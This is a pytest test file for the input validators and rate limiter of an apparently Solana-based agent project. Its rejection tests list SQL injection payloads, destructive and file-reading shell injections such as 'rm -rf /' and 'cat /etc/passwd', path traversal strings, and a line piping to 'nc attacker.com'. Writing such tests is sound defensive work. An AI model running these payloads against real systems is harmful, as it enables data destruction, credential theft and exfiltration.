"""
Test Security Module

Tests all security validation and protection mechanisms.
"""

import pytest
from agent.security import SecurityValidator, RateLimiter, rate_limiter


class TestSecurityValidator:
    """Test SecurityValidator class."""
    
    def test_validate_user_id_valid(self):
        """Test valid user IDs."""
        valid_ids = [
            "user_123",
            "abc-def",
            "test_user_456",
            "a1b2c3",
        ]
        
        for user_id in valid_ids:
            result = SecurityValidator.validate_user_id(user_id)
            assert result == user_id
    
    def test_validate_user_id_invalid(self):
        """Test invalid user IDs."""
        invalid_ids = [
            "",  # Empty
            "a" * 100,  # Too long
            "user; DROP TABLE users;",  # SQL injection
            "user && rm -rf /",  # Command injection
            "user/../etc/passwd",  # Path traversal
        ]
        
        for user_id in invalid_ids:
            with pytest.raises(ValueError):
                SecurityValidator.validate_user_id(user_id)
    
    def test_validate_wallet_address_valid(self):
        """Test valid Solana wallet addresses."""
        valid_addresses = [
            "BnepSp5cyDkpszTMfrq3iVEH6cMpiappY2hLxTjjLYyc",
            "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
        ]
        
        for address in valid_addresses:
            result = SecurityValidator.validate_wallet_address(address)
            assert result == address
    
    def test_validate_wallet_address_invalid(self):
        """Test invalid wallet addresses."""
        invalid_addresses = [
            "",  # Empty
            "not_a_wallet",  # Invalid format
            "0x1234567890",  # Ethereum address
            "wallet; DROP TABLE wallets;",  # SQL injection
        ]
        
        for address in invalid_addresses:
            with pytest.raises(ValueError):
                SecurityValidator.validate_wallet_address(address)
    
    def test_validate_transaction_hash_valid(self):
        """Test valid transaction hashes."""
        valid_hashes = [
            "5" + "a" * 87,  # 88 characters
            "3" + "b" * 63,  # 64 characters
        ]
        
        for tx_hash in valid_hashes:
            result = SecurityValidator.validate_transaction_hash(tx_hash)
            assert result == tx_hash
    
    def test_validate_transaction_hash_invalid(self):
        """Test invalid transaction hashes."""
        invalid_hashes = [
            "",  # Empty
            "abc",  # Too short
            "tx; DROP TABLE transactions;",  # SQL injection
        ]
        
        for tx_hash in invalid_hashes:
            with pytest.raises(ValueError):
                SecurityValidator.validate_transaction_hash(tx_hash)
    
    def test_validate_strategy_name_valid(self):
        """Test valid strategy names."""
        valid_names = [
            "airdrop_hunter",
            "yield_farmer",
            "nft_flipper",
        ]
        
        for name in valid_names:
            result = SecurityValidator.validate_strategy_name(name)
            assert result == name
    
    def test_validate_strategy_name_invalid(self):
        """Test invalid strategy names."""
        invalid_names = [
            "",  # Empty
            "ab",  # Too short
            "UPPERCASE",  # Must be lowercase
            "strategy-name",  # No dashes
            "strategy; DROP TABLE strategies;",  # SQL injection
        ]
        
        for name in invalid_names:
            with pytest.raises(ValueError):
                SecurityValidator.validate_strategy_name(name)
    
    def test_validate_amount_valid(self):
        """Test valid amounts."""
        valid_amounts = [
            (0.0, 0.0, 100.0),
            (50.0, 0.0, 100.0),
            (100.0, 0.0, 100.0),
            (0.001, 0.0, 1.0),
        ]
        
        for amount, min_val, max_val in valid_amounts:
            result = SecurityValidator.validate_amount(amount, min_val, max_val)
            assert result == amount
    
    def test_validate_amount_invalid(self):
        """Test invalid amounts."""
        invalid_amounts = [
            (-1.0, 0.0, 100.0),  # Below minimum
            (101.0, 0.0, 100.0),  # Above maximum
            ("not_a_number", 0.0, 100.0),  # Not a number
        ]
        
        for amount, min_val, max_val in invalid_amounts:
            with pytest.raises(ValueError):
                SecurityValidator.validate_amount(amount, min_val, max_val)
    
    def test_validate_month_valid(self):
        """Test valid month formats."""
        valid_months = [
            "2024-01",
            "2024-12",
            "2025-06",
        ]
        
        for month in valid_months:
            result = SecurityValidator.validate_month(month)
            assert result == month
    
    def test_validate_month_invalid(self):
        """Test invalid month formats."""
        invalid_months = [
            "",  # Empty
            "2024",  # Missing month
            "2024-13",  # Invalid month
            "2024-00",  # Invalid month
            "24-01",  # Wrong year format
            "2024/01",  # Wrong separator
        ]
        
        for month in invalid_months:
            with pytest.raises(ValueError):
                SecurityValidator.validate_month(month)
    
    def test_check_sql_injection(self):
        """Test SQL injection detection."""
        sql_injections = [
            "'; DROP TABLE users;--",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users",
            "' UNION SELECT * FROM passwords",
        ]
        
        for injection in sql_injections:
            with pytest.raises(ValueError):
                SecurityValidator.check_sql_injection(injection)
    
    def test_check_command_injection(self):
        """Test command injection detection."""
        command_injections = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
            "test $(ls -la)",
            "../../../etc/passwd",
            "~/secret_file",
        ]
        
        for injection in command_injections:
            with pytest.raises(ValueError):
                SecurityValidator.check_command_injection(injection)
    
    def test_sanitize_string_valid(self):
        """Test string sanitization."""
        valid_strings = [
            "Hello World",
            "User message 123",
            "Test with spaces",
        ]
        
        for string in valid_strings:
            result = SecurityValidator.sanitize_string(string)
            assert result == string
    
    def test_sanitize_string_invalid(self):
        """Test invalid strings."""
        # Too long
        with pytest.raises(ValueError):
            SecurityValidator.sanitize_string("a" * 2000, max_length=1000)
        
        # SQL injection
        with pytest.raises(ValueError):
            SecurityValidator.sanitize_string("'; DROP TABLE users;--")
        
        # Command injection
        with pytest.raises(ValueError):
            SecurityValidator.sanitize_string("test; rm -rf /")
    
    def test_sanitize_string_removes_null_bytes(self):
        """Test null byte removal."""
        string_with_null = "test\x00string"
        result = SecurityValidator.sanitize_string(string_with_null)
        assert "\x00" not in result
    
    def test_validate_file_path_valid(self):
        """Test valid file paths."""
        valid_paths = [
            "config/user.json",
            "config/wallets/wallet.enc",
        ]
        
        for path in valid_paths:
            result = SecurityValidator.validate_file_path(path, base_dir="config")
            assert result is not None
    
    def test_validate_file_path_invalid(self):
        """Test invalid file paths (path traversal)."""
        invalid_paths = [
            "../etc/passwd",
            "../../secret",
            "~/private_key",
            "config/../../../etc/passwd",
        ]
        
        for path in invalid_paths:
            with pytest.raises(ValueError):
                SecurityValidator.validate_file_path(path, base_dir="config")
    
    def test_validate_json_data_valid(self):
        """Test valid JSON data."""
        valid_data = {
            "key": "value",
            "number": 123,
            "nested": {"inner": "data"}
        }
        
        result = SecurityValidator.validate_json_data(valid_data)
        assert result == valid_data
    
    def test_validate_json_data_invalid(self):
        """Test invalid JSON data."""
        # Not a dict
        with pytest.raises(ValueError):
            SecurityValidator.validate_json_data("not a dict")
        
        # Too large
        large_data = {"key" + str(i): "value" * 1000 for i in range(100)}
        with pytest.raises(ValueError):
            SecurityValidator.validate_json_data(large_data, max_size=1000)
        
        # SQL injection in values
        with pytest.raises(ValueError):
            SecurityValidator.validate_json_data({"key": "'; DROP TABLE users;--"})


class TestRateLimiter:
    """Test RateLimiter class."""
    
    def test_rate_limit_within_limit(self):
        """Test requests within rate limit."""
        limiter = RateLimiter()
        user_id = "test_user_1"
        
        # Should allow first 10 requests
        for i in range(10):
            result = limiter.check_rate_limit(user_id, max_requests=10, window_seconds=60)
            assert result is True
    
    def test_rate_limit_exceeded(self):
        """Test rate limit exceeded."""
        limiter = RateLimiter()
        user_id = "test_user_2"
        
        # Fill up the limit
        for i in range(10):
            limiter.check_rate_limit(user_id, max_requests=10, window_seconds=60)
        
        # Next request should be blocked
        result = limiter.check_rate_limit(user_id, max_requests=10, window_seconds=60)
        assert result is False
    
    def test_rate_limit_different_users(self):
        """Test rate limiting is per-user."""
        limiter = RateLimiter()
        
        # User 1 fills their limit
        for i in range(10):
            limiter.check_rate_limit("user_1", max_requests=10, window_seconds=60)
        
        # User 2 should still be allowed
        result = limiter.check_rate_limit("user_2", max_requests=10, window_seconds=60)
        assert result is True
    
    def test_rate_limit_window_expiry(self):
        """Test rate limit window expiry."""
        import time
        
        limiter = RateLimiter()
        user_id = "test_user_3"
        
        # Make requests with very short window
        for i in range(5):
            limiter.check_rate_limit(user_id, max_requests=5, window_seconds=1)
        
        # Should be blocked
        result = limiter.check_rate_limit(user_id, max_requests=5, window_seconds=1)
        assert result is False
        
        # Wait for window to expire
        time.sleep(1.1)
        
        # Should be allowed again
        result = limiter.check_rate_limit(user_id, max_requests=5, window_seconds=1)
        assert result is True


class TestGlobalRateLimiter:
    """Test global rate limiter instance."""
    
    def test_global_rate_limiter_exists(self):
        """Test global rate limiter is available."""
        assert rate_limiter is not None
        assert isinstance(rate_limiter, RateLimiter)
    
    def test_global_rate_limiter_works(self):
        """Test global rate limiter functions."""
        user_id = "global_test_user"
        
        result = rate_limiter.check_rate_limit(user_id, max_requests=5, window_seconds=60)
        assert result is True


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
